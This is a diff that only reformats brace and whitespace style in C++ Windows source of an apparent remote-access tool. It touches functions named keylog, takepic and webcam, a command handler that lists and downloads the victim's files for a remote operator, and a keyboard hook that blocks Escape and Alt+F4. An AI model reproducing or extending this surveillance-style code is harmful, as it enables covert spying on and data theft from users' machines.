@@ -388,7 +388,6 @@ void keylog()
     }
 }
 
-
 void takepic()
 {
     string ss;
@@ -981,7 +980,7 @@ void webcam()
         }
         else if (cmd == "QUIT")
         {
-         
+
             streaming = false;
             isRecording = false;
 
@@ -994,10 +993,13 @@ void webcam()
     }
 }
 
-static wstring toWide(const string& str) {
-    if (str.empty()) return wstring();
+static wstring toWide(const string &str)
+{
+    if (str.empty())
+        return wstring();
     int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
-    if (size_needed <= 0) { 
+    if (size_needed <= 0)
+    {
         size_needed = MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), NULL, 0);
     }
     wstring wstrTo(size_needed, 0);
@@ -1013,30 +1015,35 @@ void fileManagement()
     {
         receiveSignal(cmd);
 
-        if (cmd == "LIST") {
+        if (cmd == "LIST")
+        {
             string path;
-            receiveSignal(path); 
+            receiveSignal(path);
             sendLine("FILELIST");
 
             wstring wPath = toWide(path);
-            if (!wPath.empty() && wPath.back() != L'\\') wPath += L"\\";
+            if (!wPath.empty() && wPath.back() != L'\\')
+                wPath += L"\\";
             wstring wSearchPath = wPath + L"*";
 
-            WIN32_FIND_DATAW findData; 
-            HANDLE hFind = FindFirstFileW(wSearchPath.c_str(), &findData); 
+            WIN32_FIND_DATAW findData;
+            HANDLE hFind = FindFirstFileW(wSearchPath.c_str(), &findData);
 
-            if (hFind != INVALID_HANDLE_VALUE) {
-                do {
+            if (hFind != INVALID_HANDLE_VALUE)
+            {
+                do
+                {
                     wstring wName = findData.cFileName;
-                    if (wName == L"." || wName == L"..") continue;
+                    if (wName == L"." || wName == L"..")
+                        continue;
 
-                    string name = toUtf8(wName.c_str()); 
-                    
+                    string name = toUtf8(wName.c_str());
+
                     string type = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";
                     ULONGLONG fileSize = ((ULONGLONG)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
 
                     string line = type + "|" + name + "|" + to_string(fileSize);
-                    sendLine(line); 
+                    sendLine(line);
                 } while (FindNextFileW(hFind, &findData));
                 FindClose(hFind);
             }
@@ -1057,7 +1064,7 @@ void fileManagement()
         }
         else if (cmd == "DOWNLOAD")
         {
-       
+
             string filePath;
             receiveSignal(filePath);
 
@@ -1223,9 +1230,10 @@ LRESULT CALLBACK BlockEscProc(int nCode, WPARAM wParam, LPARAM lParam)
 
         if (pKey->vkCode == VK_ESCAPE)
         {
-            return 1; 
+            return 1;
         }
-        if (pKey->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) {
+        if (pKey->vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000))
+        {
             return 1;
         }
     }
@@ -1257,7 +1265,7 @@ LRESULT CALLBACK ChatWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
     case WM_COMMAND:
         if (LOWORD(wParam) == 1)
-        { 
+        {
             int len = GetWindowTextLengthW(hChatInput);
             if (len > 0)
             {
@@ -1272,7 +1280,7 @@ LRESULT CALLBACK ChatWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         }
         break;
     case WM_CLOSE:
-        ShowWindow(hwnd, SW_HIDE); 
+        ShowWindow(hwnd, SW_HIDE);
         return 0;
 
     case WM_DESTROY:
@@ -1320,7 +1328,7 @@ void chatModule()
     {
         isGuiRunning = true;
         thread gui(chatGuiThread);
-        gui.detach(); 
+        gui.detach();
         while (!hChatWnd)
             Sleep(50);
     }
